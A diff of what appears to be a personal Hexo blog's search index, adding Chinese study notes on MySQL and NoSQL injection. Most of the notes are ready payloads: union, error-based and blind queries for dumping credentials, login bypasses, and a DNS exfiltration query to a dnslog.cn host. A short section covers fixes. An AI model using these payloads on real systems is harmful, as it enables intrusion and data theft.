+<th align="left">方式</th>
+<th align="left">选择条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">union联合查询</td>
+<td align="left">有显示位</td>
+</tr>
+<tr>
+<td align="left">报错注入</td>
+<td align="left">mysql_error调试未删除，控制报错信息</td>
+</tr>
+<tr>
+<td align="left">bool盲注</td>
+<td align="left">页面没显示位、不报错，只能通过页面是否正常来判断，通常为登录页面</td>
+</tr>
+<tr>
+<td align="left">时间延时盲注</td>
+<td align="left">页面没显示位、不报错，页面都显示正常，只能通过页面响应时间判断</td>
+</tr>
+</tbody></table>
+<p><strong>万能密码</strong></p>
+<pre class="highlight"><span class="line">admin&#x27; or 1=&#x27;1</span><br></pre>
+
+<p>语境</p>
+<pre class="highlight"><span class="line">select * from name = &#x27;admin&#x27; or 1=&#x27;1&#x27; and pass=&#x27;&#x27;;</span><br></pre>
+
+<p>关键：</p>
+<p>使用or进行逻辑判断，构造true语句，使得整个判断语句为true</p>
+<h1 id="三、手工注入流程"><a href="#三、手工注入流程" class="headerlink" title="三、手工注入流程"></a>三、手工注入流程</h1><p>1、判断换是否有注入漏洞，识别注入点类型</p>
+<p>2、获取数据库中的信息</p>
+<p> 获取数据库基本信息（数据库版本、数据库类型、查询列数等）</p>
+<p> 获取数据库库名</p>
+<p> 获取表名</p>
+<p> 获取列名</p>
+<p> 获取用户数据</p>
+<p>3、破解加密数据（数据解密）</p>
+<p>4、提升权限（配合其他漏洞）</p>
+<p>5、内网渗透（配合其他漏洞）</p>
+<h1 id="四、详细过程"><a href="#四、详细过程" class="headerlink" title="四、详细过程"></a>四、详细过程</h1><h2 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h2><h3 id="1、判断是否存在注入漏洞"><a href="#1、判断是否存在注入漏洞" class="headerlink" title="1、判断是否存在注入漏洞"></a>1、判断是否存在注入漏洞</h3><p>（需要结合数据情景，判断可能使用的sql语句）</p>
+<p>找与数据库交互的位置，判断动态参数，需要结合burpsuite抓包</p>
+<p>1、参数后加 <code>&#39; &quot; \</code>（全加），判断页面是否异常（\必出异常，不用做后续判断）</p>
+<p>2、若出现异常，则依次尝试修改判断字符，使页面返回正常。返回正常则为字符型注入。</p>
+<p>&gt;&gt;若均未返回正常页面，则尝试2-1(若原数据为1)判断是否为整数型注入。（正常则为整数型注入）</p>
+<p>3、使用使页面报错的字符，后加#（url中需url编码为%23）；若正常则只有该截断字符，不正常继续判断其他截断字符。</p>
+<p>&gt;&gt;再加)#；正常则含有括号，不正常则进行嵌套判断。</p>
+<p>4、以上均没有，则判断特殊注入。二次编码注入、宽字节注入、时间延时盲注等（这些类型注入，使用单双信号页面无变化）。</p>
+<h3 id="2、判断数据库列数"><a href="#2、判断数据库列数" class="headerlink" title="2、判断数据库列数"></a>2、判断数据库列数</h3><p>order by + 数字</p>
+<p>报错则用二分法继续判断，直至正常。精确到正常的临界数字，即为列数。</p>
+<p><code>&#39; order by 5#</code></p>
+<p>修改2为-2，使默认查询语句结果为空，隐去；这样union select结果即可显示。</p>
+<p>然后使用union select联合查,寻找显示位：</p>
+<p><code>id = -2 union select 1,2,3,4；</code></p>
+<h3 id="3、数据库信息查询"><a href="#3、数据库信息查询" class="headerlink" title="3、数据库信息查询"></a>3、数据库信息查询</h3><table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">查库名</td>
+<td align="left"><code>-1 union select 1,2,database()-- a</code> 推荐 <br><code>-1 union select 1,2,(select group_concat(0x7e,(schema_name),0x7e) from information_schema.schemata)– a</code></td>
+</tr>
+<tr>
+<td align="left">查表名</td>
+<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#39;数据库名&#39;)-- a</code></td>
+</tr>
+<tr>
+<td align="left">查列名</td>
+<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(column_name),0x7e) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;)-- a</code></td>
+</tr>
+<tr>
+<td align="left">查数据</td>
+<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(uname,0x7e,pwd),0x7e) from dede_cms.dede_tb)-- a</code></td>
+</tr>
+</tbody></table>
+<p><strong>注意</strong>：</p>
+<p>1、union select查询列数要与前面列数相同</p>
+<p>2、concat()拼接多列结果，group_concat()拼接多行结果。</p>
+<p>如</p>
+<pre class="highlight"><span class="line">SELECT * FROM db_bbs.tb_user UNION SELECT 1,(SELECT group_concat(table_name,&#x27;|&#x27;)FROM information_schema.`TABLES` WHERE TABLES_schema=&#x27;db_bbs&#x27;;),3,4;</span><br></pre>
+
+<p>3、可将查询内容去掉引号，转成16进制形式（前面加上0x）</p>
+<p>4、查表时，建议使用database()，既能避免转义，还可以确定当前有效数据库</p>
+<p>即</p>
+<pre class="highlight"><span class="line">SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()</span><br></pre>
+
+
+
+<p><strong>数据库常用函数</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">version()</td>
+<td align="left">数据库版本号</td>
+</tr>
+<tr>
+<td align="left">database()</td>
+<td align="left">当前数据库</td>
+</tr>
+<tr>
+<td align="left">user()</td>
+<td align="left">当前用户</td>
+</tr>
+<tr>
+<td align="left">current_user()</td>
+<td align="left">当前用户名</td>
+</tr>
+<tr>
+<td align="left">system_user()</td>
+<td align="left">系统用户名</td>
+</tr>
+<tr>
+<td align="left">@@datadir</td>
+<td align="left">数据库路径</td>
+</tr>
+<tr>
+<td align="left">@@version_compile_os</td>
+<td align="left">操作系统版本</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">常用函数</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">limit</td>
+<td align="left">限制查询数量，下标从0开始 limit 0,1 从0开始查两个</td>
+</tr>
+<tr>
+<td align="left">length()</td>
+<td align="left">计算数据长度</td>
+</tr>
+<tr>
+<td align="left">count()</td>
+<td align="left">计算数据行数</td>
+</tr>
+<tr>
+<td align="left">mid(str,1,30)</td>
+<td align="left">截取字符串，从1开始截取30位,紧跟要截取的部分，即数据库名、表名、字段名和数据名</td>
+</tr>
+<tr>
+<td align="left">substr(str,0,30)</td>
+<td align="left">0为截取初始位，包含整个查询语句</td>
+</tr>
+<tr>
+<td align="left">ascii()</td>
+<td align="left">转为ascii码</td>
+</tr>
+</tbody></table>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1、相关函数"><a href="#1、相关函数" class="headerlink" title="1、相关函数"></a>1、相关函数</h3><table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">updatexml(arg1,arg2,arg3) <br>查询符合条件的数据 XPATH路径报错</td>
+<td align="left">and updatexml(1,concat(0x5e,(select user()),0x5e),1)  <br>mysql5.1.5及以上版本，输出有32位长度限制 0x5e为^的16进制编码，用于绕过斜杠转义，下同</td>
+</tr>
+<tr>
+<td align="left">extractvalue(arg1,arg2) <br>同上，两个参数 XPATH路径报错</td>
+<td align="left">and extractvalue(1,concat(0x5e,(select user()),0x5e))  <br>mysql5.1及以上版本,输出有32位长度限制</td>
+</tr>
+<tr>
+<td align="left">floor() <br>返回小于等于该值的最大整数（只返回整数部分） floor、count、group by函数冲突报错</td>
+<td align="left">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)  <br>mysql5.0及以上版本，user()可变，其他固定</td>
+</tr>
+<tr>
+<td align="left">name_const(name,value) <br>产生一个结果集合列 列名重复报错</td>
+<td align="left">and select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a  <br>mysql5.0及以下</td>
+</tr>
+<tr>
+<td align="left">exp() 以e为底的指数函数 整形溢出报错</td>
+<td align="left">and exp(~(select * from (select user()) a))  <br>mysql5.5.5及以上版本</td>
+</tr>
+<tr>
+<td align="left">几何函数报错（不满足要求就会报错） <br>geometrycollection() <br>multipoint() <br>polygon() <br>multipolygon() <br>linestring() <br>multilinestring()</td>
+<td align="left">and multipoint((select * from (select * from (select * from (select version())a)b)c))</td>
+</tr>
+</tbody></table>
+<h3 id="2、用法："><a href="#2、用法：" class="headerlink" title="2、用法："></a>2、用法：</h3><p>将对应user()等地方替换为要执行的sql语句即可</p>
+<table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">查数据库名</td>
+<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- a</code> 推荐 <br>或 <br><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(schema_name),1,30) from information_schema.schemata),0x7e),1)-- a</code></td>
+</tr>
+<tr>
+<td align="left">查表名</td>
+<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(table_name),1,30) from information_schema.tables where table_schema=&#39;数据库&#39;),0x7e),1)-- a</code></td>
+</tr>
+<tr>
+<td align="left">查列名</td>
+<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(column_name),1,30) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;),0x7e),1)-- a</code></td>
+</tr>
+<tr>
+<td align="left">查数据</td>
+<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(username,0x7e,password),1,30) from &#39;数据库名&#39;.&#39;表名&#39;),0x7e),1)-- a</code></td>
+</tr>
+</tbody></table>
+<h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>条件匹配时返回数据，不匹配时无显示。需要对数据进行猜解（用ascii码进行匹配）</p>
+<p>1、用法：</p>
+<p>ascii码二分法</p>
+<table>
+<thead>
+<tr>
+<th align="left">说明</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">先判断数据长度或个数</td>
+<td align="left">and length((select database())) &gt; 64</td>
+</tr>
+<tr>
+<td align="left">然后进行二分法匹配</td>
+<td align="left">and ascii(mid((select database()),1,1)) &gt;64</td>
+</tr>
+</tbody></table>
+<p>2、语句（省略二分法，直接用=号）</p>
+<p>n均为前一句获取的长度值</p>
+<table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">获取数据库长度</td>
+<td align="left"><code>and (length(database()))=8</code> <br>注意：判断长度不需要转ascii码</td>
+</tr>
+<tr>
+<td align="left">获取数据库名</td>
+<td align="left"><code>and ascii((select mid(database(),1,1)))=115 -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取表长度</td>
+<td align="left"><code>and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=30 -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取表名</td>
+<td align="left"><code>and ascii((select mid(group_conca(table_name),1,1) from information_schema.tables where table_schema=database()))=100 -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取列长度</td>
+<td align="left"><code>and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30 -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取列名</td>
+<td align="left"><code>and ascii((select mid(group_concat(column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30 -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取数据长度</td>
+<td align="left"><code>and length((select group_concat(username) from database().&#39;表名&#39;))=30 -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取数据</td>
+<td align="left"><code>and ascii((select mid((username,password),1,1) from database().&#39;表名&#39;))=30 -- a</code></td>
+</tr>
+</tbody></table>
+<h3 id="时间延时盲注"><a href="#时间延时盲注" class="headerlink" title="时间延时盲注"></a>时间延时盲注</h3><p>（单双引号页面无变化）</p>
+<p>基于sql盲注，为升级版本</p>
+<p>使用’”%判断时，页面无任何变化，尝试判断是否存在时间盲注</p>
+<p>1、判断：</p>
+<p><code>&#39; &quot; \</code></p>
+<p><code>&#39;and sleep(3) %23</code></p>
+<p><code>&#39; and sleep(3))%23</code></p>
+<p>…</p>
+<p>方法同判断截断字符</p>
+<p>2、用法：</p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">if</td>
+<td align="left">select if(arg1,arg2,arg3) <br>arg1：判断条件 <br>arg2：条件为真时执行的语句 <br>arg3：条件为假时执行的语句  <br>常用： <br>and select if((length(database())&gt;5),sleep(5),1) –a</td>
+</tr>
+<tr>
+<td align="left">case when</td>
+<td align="left">select case when arg1 then arg2 else arg3 end; <br>arg1：判断条件 <br>arg2：条件为真时执行的语句<br>arg3：条件为假时执行的语句  <br>常用： <br>and select case when ascci(mid(version(),1,1))&gt;64 then sleep(3) end – a</td>
+</tr>
+</tbody></table>
+<p>3、语句如下（省略二分法，直接用=号）</p>
+<table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">获取数据库长度</td>
+<td align="left"><code>and if((length(database()))=8),sleep(3),1)-- a</code> <br>注意：判断长度不需要转ascii码</td>
+</tr>
+<tr>
+<td align="left">获取数据库名</td>
+<td align="left"><code>and if((ascii((select mid(database(),1,1)))=115),sleep(3),1) -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取表长度</td>
+<td align="left"><code>and if((length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=30),sleep(3),1) -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取表名</td>
+<td align="left"><code>and if((ascii((select mid(group_concat(table_name),1,1) from information_schema.tables where table_schema=database()))=100),sleep(3),1) -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取列长度</td>
+<td align="left"><code>and if((length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取列名</td>
+<td align="left"><code>and if((ascii((select mid(goup_concat(column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取数据长度</td>
+<td align="left"><code>and if((length((select group_concat(username) from database().&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取字段名</td>
+<td align="left"><code>and if((ascii((select mid(goup_concat(username),1,1) from database().&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
+</tr>
+</tbody></table>
+<p>注： sleep可用benchmark代替</p>
+<p><code>benchmark(arg1,arg2)</code></p>
+<p>arg1为执行次数，arg2为执行语句</p>
+<p>即执行多少次指定语句，返回执行事件，次数500万次起步，基于cpu质量，延时不稳定</p>
+<p>benchmark(5000000,md5(123)) 执行500万次MD5加密</p>
+<p>select if(判断语句,benchmark(5000000,md5(123)),1)</p>
+<h1 id="五、其他注入类型"><a href="#五、其他注入类型" class="headerlink" title="五、其他注入类型"></a>五、其他注入类型</h1><h2 id="1、请求头注入"><a href="#1、请求头注入" class="headerlink" title="1、请求头注入"></a>1、请求头注入</h2><table>
+<thead>
+<tr>
+<th align="left">类型</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">User-Agent</td>
+<td align="left">浏览器版本</td>
+</tr>
+<tr>
+<td align="left">X-Forwarded-For</td>
+<td align="left">获取HTTP请求端的真实IP</td>
+</tr>
+</tbody></table>
+<p>使用Header Editor工具修改请求头，在上述两个值后添加单双引号，保持开启状态即可</p>
+<p>注意，这里的sql语句大概率为insert，所以可用注入为：</p>
+<p>报错注入和bool盲注</p>
+<h3 id="2、内联注入"><a href="#2、内联注入" class="headerlink" title="2、内联注入"></a>2、内联注入</h3><p>留言板界面若是存在注入，可用补齐insert语句参数法，</p>
+<p>找到留言板的显示位，在显示位上进行sql注入。</p>
+<p>这里难点在于插入位数未知、插入类型限制未知，所以位数需要逐个尝试，内容留空。</p>
+<p>使用</p>
+<p>不用注释，用截断代替，然后使用多个and/or连接</p>
+<p>注：前面为true用and；前面为false用or</p>
+<p>1、<code>&#39;firefox&#39; and &#39;</code>补齐</p>
+<p>2、<code>&#39;firefox&#39; and payload and &#39;</code></p>
+<h3 id="3、宽字节注入"><a href="#3、宽字节注入" class="headerlink" title="3、宽字节注入"></a>3、宽字节注入</h3><p>（单双引号页面无变化）</p>
+<p>mysql语句执行时，现将数据转成16进制，再执行</p>
+<p>GBK为两字节编码方式，编码范围为8140-FEFE（81为页数，40位行列）</p>
+<p>ascii为单字节编码，编码范围为00-7F（斜杠的ascii码为5C）</p>
+<p>当字节数小于81时，会被认为是ascii编码，将转码成ascii码形式；</p>
+<p>当字节数在81-FE之间时，会被认为是gbk编码，会连同后一位一起以gbk形式编码。</p>
+<p>形如abcd（ab为ascii转码的数据，cd为gbk转码的数据）</p>
+<p>原本应解码成两个ascii数据（a、b）和一个gbk数据（cd）</p>
+<p>但是若b的数据大于81，则会被认为是gbk编码的数据，会和c一起解码，</p>
+<p>此时就解码成了两个ascii数据（a、d）和一个gbk编码数据（bc）</p>
+<p><strong>用法：</strong></p>
+<p>注意：通常出现在斜杠转义单双引号的网页</p>
+<p>利用：构造?id=1%df’即可</p>
+<p>%df可以为任何hex码在81-FE之间的数据</p>
+<p><strong>宽字节注入存在条件</strong></p>
+<p>PHP+Mysql+GBK</p>
+<p><strong>编码语句：</strong></p>
+<pre class="highlight"><span class="line">mysql_set_charset(&quot;gbk&quot;)</span><br><span class="line"></span><br><span class="line">mysql_query(&quot;set names gbk&quot;)</span><br></pre>
+
+<p>转义语句：</p>
+<pre class="highlight"><span class="line">addslashes(&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">mysql_real_escape_string(&#x27;&#x27;)</span><br></pre>
+
+<p>上述四条语句组合中，除了</p>
+<p><code>mysql_set_charset(&quot;gbk&quot;)+mysql_real_escape_string(&#39;&#39;)</code>组合，其他组合均存在宽字节注入</p>
+<h3 id="4、二次编码注入"><a href="#4、二次编码注入" class="headerlink" title="4、二次编码注入"></a>4、二次编码注入</h3><p>(单双引号页面无变化)</p>
+<p>注！先转义再解码造成注入，应先解码再转义</p>
+<table>
+<thead>
+<tr>
+<th align="left">正确流程</th>
+<th align="left">错误流程（二次编码注入）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">php自动进行一次url解码 网站二次解码 转义单双引号进行防护 写入数据库</td>
+<td align="left">php自动解码 转义防护 网站二次解码 urldecode()、rawurldecode() 写入数据库</td>
+</tr>
+</tbody></table>
+<p>单引号二次url编码为：%2527</p>
+<p>双引号二次url编码为：%2522</p>
+<p>关键字二次编码：hex转码-前缀加%25（%的url编码）</p>
+<h3 id="5、堆叠注入"><a href="#5、堆叠注入" class="headerlink" title="5、堆叠注入"></a>5、堆叠注入</h3><p>前提：存在sql注入</p>
+<p>截断符后使用分号分割，后面注释，中间插入任意sql语句（多个语句用;分割）</p>
+<p>堆叠注入存在场景</p>
+<table>
+<thead>
+<tr>
+<th align="left">搭配</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">mssql+asp/php/jsp</td>
+<td align="left">堆叠注入</td>
+</tr>
+<tr>
+<td align="left">mysql+php</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">mysql_connect()/mysql_query(“select $id”)</td>
+<td align="left">不能堆叠注入</td>
+</tr>
+<tr>
+<td align="left">mysqli_connect()/mysqli_query(“select $id”)</td>
+<td align="left">不能堆叠注入</td>
+</tr>
+<tr>
+<td align="left">mysqli_connect()/multi_query(“select $id”)</td>
+<td align="left">堆叠注入</td>
+</tr>
+<tr>
+<td align="left">new PDO()/bindvalue(“select ?”) execute($id)</td>
+<td align="left">不能注入</td>
+</tr>
+<tr>
+<td align="left">new PDO()/query(“select $id”)</td>
+<td align="left">堆叠注入</td>
+</tr>
+</tbody></table>
+<h3 id="6、二阶注入"><a href="#6、二阶注入" class="headerlink" title="6、二阶注入"></a>6、二阶注入</h3><p>存储在数据库汇总的数据，在使用时发生的注入</p>
+<p>在注册用户或者发表文章等写入数据库操作时，加入注入语句，被转义存入数据库</p>
+<p>当使用该数据时，被取出，这时注入语句生效</p>
+<p>注意：遇到限制是数字类型或者关键字拦截，可进行十六进制编码</p>
+<h3 id="7、其他："><a href="#7、其他：" class="headerlink" title="7、其他："></a>7、其他：</h3><p>文件上传时，可通过文件名进行sql注入</p>
+<h1 id="六、DNS外带"><a href="#六、DNS外带" class="headerlink" title="六、DNS外带"></a>六、DNS外带</h1><p><strong>前提：</strong></p>
+<p>Windows服务器，secure_file_priv为空（非NULL）</p>
+<p><strong>语句：</strong></p>
+<pre class="highlight"><span class="line">select load_file(concat(&quot;\\\\&quot;,version(),&quot;.1ndex.dnslog.cn\\x&quot;));</span><br></pre>
+
+<h1 id="七、sql注入防护-修复"><a href="#七、sql注入防护-修复" class="headerlink" title="七、sql注入防护/修复"></a>七、sql注入防护/修复</h1><table>
+<thead>
+<tr>
+<th align="left">修复</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">去掉单引号</td>
+<td align="left">现实场景常用单引号，去掉不合实际</td>
+</tr>
+<tr>
+<td align="left">转义单引号</td>
+<td align="left">对数字型无效（数字型不需要引号） 斜杠转义 addslashes()函数转义 php.ini配置文件转义（5.6以下版本开启magic_quotes_gpc = On）</td>
+</tr>
+<tr>
+<td align="left">强制类型转换</td>
+<td align="left">针对数字型 intval()</td>
+</tr>
+<tr>
+<td align="left">更改数据库连接方式</td>
+<td align="left">POD连接数据库将变量转换成字符串，再写入数据库，无法拼接</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>mysql</tag>
       </tags>
   </entry>
   <entry>
@@ -2676,7 +3216,7 @@
 </thead>
 <tbody><tr>
 <td align="left">重言式/永真式</td>
-<td align="left"><code>/login.php?username[$ne]=1&amp;password[$ne]=1</code> <br>防御： <br>可以通过函数is_array（）将输入参数转变为字符串类型来解决 <br>如：<br><code>db-&gt;logins-&gt;find(array(&quot;username&quot;=&gt;(string)$_POST[&quot;username&quot;],&quot;password&quot;=&gt;(string)$_POST[&quot;password&quot;])); </code><br><br>注意： <br>1、必须要结合PHP语言才能导致重言式注入（依据PHP语言的特性） <br>2、如果是POST方法传参，可以结合BurpSuite抓包、改包进行绕过。 <br>3、使用正则表达式,也可以构造永真式如：<br><code>username[$regex]=.?&amp;password[$regex]=.?</code><br>.?为匹配所有字符串<br>变为 <code>?username[$regex]=^a&amp;password[$regex]=.? </code><br>不断爆破a即可，^ab…直到爆不出，爆破字符为数字字母符号，符号需要转义</td>
+<td align="left"><code>/login.php?username[$ne]=1&amp;password[$ne]=1</code> <br>防御： <br>可以通过函数is_array()将输入参数转变为字符串类型来解决 <br>如：<br><code>db-&gt;logins-&gt;find(array(&quot;username&quot;=&gt;(string)$_POST[&quot;username&quot;],&quot;password&quot;=&gt;(string)$_POST[&quot;password&quot;])); </code><br><br>注意： <br>1、必须要结合PHP语言才能导致重言式注入（依据PHP语言的特性） <br>2、如果是POST方法传参，可以结合BurpSuite抓包、改包进行绕过。 <br>3、使用正则表达式,也可以构造永真式如：<br><code>username[$regex]=.?&amp;password[$regex]=.?</code><br>.?为匹配所有字符串<br>变为 <code>?username[$regex]=^a&amp;password[$regex]=.? </code><br>不断爆破a即可，^ab…直到爆不出，爆破字符为数字字母符号，符号需要转义</td>
 </tr>
 <tr>
 <td align="left">JavaScript注入</td>
@@ -2684,7 +3224,7 @@
 </tr>
 <tr>
 <td align="left">mongo shell拼接注入</td>
-<td align="left"><code>”&#125;);db.表名.insert(&#123;“name”:”hi”&#125;);db.表名.find(&#123;“author”:”1 </code><br>在两个db.message.find中间的位置，插入任意想要执行的代码  <br>产生的原因： <br>PHP中，通过executeCommand可以执行shell命令，可以直接执行语句。同样是存在字符串拼接的问题，因此通过使用单引号、双引号构造闭合语句，就可以执行任意的语句。</td>
+<td align="left"><code>&quot;&#125;);db.表名.insert(&#123;&quot;name&quot;:&quot;hi&quot;&#125;);db.表名.find(&#123;&quot;author&quot;:&quot;1 </code><br>在两个db.message.find中间的位置，插入任意想要执行的代码  <br>产生的原因： <br>PHP中，通过executeCommand可以执行shell命令，可以直接执行语句。同样是存在字符串拼接的问题，因此通过使用单引号、双引号构造闭合语句，就可以执行任意的语句。</td>
 </tr>
 </tbody></table>
 ]]></content>
@@ -2696,555 +3236,15 @@
       </tags>
   </entry>
   <entry>
-    <title>Mysql注入</title>
-    <url>/article/Mysql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<p>端口：3306</p>
-<h1 id="一、SQL注入产生原因"><a href="#一、SQL注入产生原因" class="headerlink" title="一、SQL注入产生原因"></a>一、SQL注入产生原因</h1><p>1、不当的类型处理</p>
-<p>2、不安全的数据库配置</p>
-<p>3、不合理的查询集处理</p>
-<p>4、不当的错误处理</p>
-<p>5、转义字符处理不合适</p>
-<p>6、多个提交处理不当</p>
-<h1 id="二、SQL注入关键条件"><a href="#二、SQL注入关键条件" class="headerlink" title="二、SQL注入关键条件"></a>二、SQL注入关键条件</h1><p>1、用户能控制输入的内容</p>
-<p>2、Web应用能把用户输入的内容带入到数据库中执行</p>
-<p>SQL注入分类</p>
-<table>
-<thead>
-<tr>
-<th align="left">分类</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">根据请求方式分类 （判断注入工具：Burpsuite等）</td>
-<td align="left">GET方式请求注入 POST方式请求注入</td>
-</tr>
-<tr>
-<td align="left">根据注入点参数分类 （判断手法：’、”、\）</td>
-<td align="left">字符型注入 整数型注入 搜索型注入（%’and ‘%’=’ 闭合%）</td>
-</tr>
-<tr>
-<td align="left">根据SQL注入点反馈类型分类（重点） （判断注入payload）</td>
-<td align="left">union类型 基于错误显示 布尔类型 基于时间 其他类型</td>
-</tr>
-<tr>
-<td align="left">根据Web应用的数据库类型分类 （判断注入语句）</td>
-<td align="left">MySQL SQLServer Oracle Access</td>
-</tr>
-</tbody></table>
-<p>基于反馈类型分类注入流程</p>
-<table>
-<thead>
-<tr>
-<th align="left">方式</th>
-<th align="left">选择条件</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">union联合查询</td>
-<td align="left">有显示位</td>
-</tr>
-<tr>
-<td align="left">报错注入</td>
-<td align="left">mysql_error调试未删除，控制报错信息</td>
-</tr>
-<tr>
-<td align="left">bool盲注</td>
-<td align="left">页面没显示位、不报错，只能通过页面是否正常来判断，通常为登录页面</td>
-</tr>
-<tr>
-<td align="left">时间延时盲注</td>
-<td align="left">页面没显示位、不报错，页面都显示正常，只能通过页面响应时间判断</td>
-</tr>
-</tbody></table>
-<p><strong>万能密码</strong></p>
-<pre class="highlight"><span class="line">admin&#x27; or 1=&#x27;1</span><br></pre>
-
-<p>语境</p>
-<pre class="highlight"><span class="line">select * from name = &#x27;admin&#x27; or 1=&#x27;1&#x27; and pass=&#x27;&#x27;;</span><br></pre>
-
-<p>关键：</p>
-<p>使用or进行逻辑判断，构造true语句，使得整个判断语句为true</p>
-<h1 id="三、手工注入流程"><a href="#三、手工注入流程" class="headerlink" title="三、手工注入流程"></a>三、手工注入流程</h1><p>1、判断换是否有注入漏洞，识别注入点类型</p>
-<p>2、获取数据库中的信息</p>
-<p> 获取数据库基本信息（数据库版本、数据库类型、查询列数等）</p>
-<p> 获取数据库库名</p>
-<p> 获取表名</p>
-<p> 获取列名</p>
-<p> 获取用户数据</p>
-<p>3、破解加密数据（数据解密）</p>
-<p>4、提升权限（配合其他漏洞）</p>
-<p>5、内网渗透（配合其他漏洞）</p>
-<h1 id="四、详细过程"><a href="#四、详细过程" class="headerlink" title="四、详细过程"></a>四、详细过程</h1><h2 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h2><h3 id="1、判断是否存在注入漏洞"><a href="#1、判断是否存在注入漏洞" class="headerlink" title="1、判断是否存在注入漏洞"></a>1、判断是否存在注入漏洞</h3><p>（需要结合数据情景，判断可能使用的sql语句）</p>
-<p>找与数据库交互的位置，判断动态参数，需要结合burpsuite抓包</p>
-<p>1、参数后加 <code>&#39; &quot; \</code>（全加），判断页面是否异常（\必出异常，不用做后续判断）</p>
-<p>2、若出现异常，则依次尝试修改判断字符，使页面返回正常。返回正常则为字符型注入。</p>
-<p>&gt;&gt;若均未返回正常页面，则尝试2-1(若原数据为1)判断是否为整数型注入。（正常则为整数型注入）</p>
-<p>3、使用使页面报错的字符，后加#（url中需url编码为%23）；若正常则只有该截断字符，不正常继续判断其他截断字符。</p>
-<p>&gt;&gt;再加)#；正常则含有括号，不正常则进行嵌套判断。</p>
-<p>4、以上均没有，则判断特殊注入。二次编码注入、宽字节注入、时间延时盲注等（这些类型注入，使用单双信号页面无变化）。</p>
-<h3 id="2、判断数据库列数"><a href="#2、判断数据库列数" class="headerlink" title="2、判断数据库列数"></a>2、判断数据库列数</h3><p>order by + 数字</p>
-<p>报错则用二分法继续判断，直至正常。精确到正常的临界数字，即为列数。</p>
-<p><code>&#39; order by 5#</code></p>
-<p>修改2为-2，使默认查询语句结果为空，隐去；这样union select结果即可显示。</p>
-<p>然后使用union select联合查,寻找显示位：</p>
-<p><code>id = -2 union select 1,2,3,4；</code></p>
